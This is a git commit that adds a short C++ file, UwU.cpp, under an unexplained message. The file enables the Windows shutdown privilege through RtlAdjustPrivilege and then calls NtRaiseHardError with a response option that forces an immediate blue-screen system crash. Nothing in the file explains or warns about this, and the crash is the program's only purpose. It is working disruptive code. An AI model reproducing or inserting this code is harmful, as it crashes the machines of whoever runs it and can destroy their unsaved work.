2c7880544ced3bb726354e0c00aaefa795bb63b2
Delta <147620129+MrDeltaa@users.noreply.github.com>
2024-09-19 11:49:46 +0200

    + UwU code cpp

---
+++ UwU.cpp
@@ -0,0 +1,33 @@
+﻿#include <iostream>
+#include <windows.h>
+#include <winternl.h>
+
+using _NtRaiseHardError = NTSTATUS (NTAPI *)(
+	NTSTATUS ErrorStatus,
+	ULONG NumberOfParameters,
+	ULONG UnicodeStringParametrMask,
+	PULONG_PTR Parameters, 
+	ULONG ValidResponseOptions,
+	PULONG Response
+);
+
+using _RtlAdjustPrivilege = NTSTATUS(NTAPI *)(
+	ULONG Privilege,
+	BOOLEAN Enable,
+	BOOLEAN CurentThread,
+	PBOOLEAN Enabled
+);
+
+int main() {
+	auto NtRaiseHardError = (_NtRaiseHardError)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRaiseHardError");
+	auto RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlAdjustPrivilege");
+	
+	BOOLEAN bEnabled;
+	ULONG uResponse;
+
+	RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
+
+	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &uResponse);
+
+	return 0;
+}
